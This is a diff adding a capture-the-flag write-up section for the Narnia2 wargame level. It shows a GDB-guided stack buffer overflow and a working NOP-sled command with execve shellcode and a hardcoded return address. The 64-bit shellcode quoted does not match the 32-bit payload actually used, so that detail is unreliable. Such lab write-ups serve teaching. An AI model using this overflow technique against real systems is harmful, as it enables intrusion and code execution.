@@ -21,3 +21,33 @@ export EGG=`python -c 'print "<shellcode>"'`
 ./narnia1
 ```
 
+## Narnia2
+
+The buffer is `char buf[128]` and the function we will exploit will be `strcpy(buf,argv[1]);`.
+In order to see where is the range of address we can fall in using a **NOP-Sled**, first of all we have to fill the buffer with 128 "A", inside GDB.
+Note the breakpoint at *strcpy*
+
+`gdb narnia2`
+
+```bash
+b strcpy
+run $(python -c 'print 128 * "A" + "BBBB"+ "CCCC"') #where B is the $ebp and C is the ret address
+x/700xw $esp #analyzing the stack to detect "AAAA" B(41414141)
+```
+
+With GDB we see that in the stack we have "CCCC" in the return address of strcpy, then here we will put our middle-address of the  **NOP-Sled**. Again, any [shellcode](https://www.exploit-db.com/shellcodes/47513) can be used if it is small enough to fit into the NOPs.
+
+`shellcode="\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"`
+
+`return address="\x4c\xd8\xff\xff"` (You can also choose yours analyzing the stack)
+
+Number of NOPs = **128**(buff) - **25**(shellcode) + **4**($ebp) = 107
+
+Let's run the program with:
+
+```bash
+./narnia2 $(python -c 'print 107 * "\x90" + "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"+"\x4c\xd8\xff\xff"')
+```
+
+
+
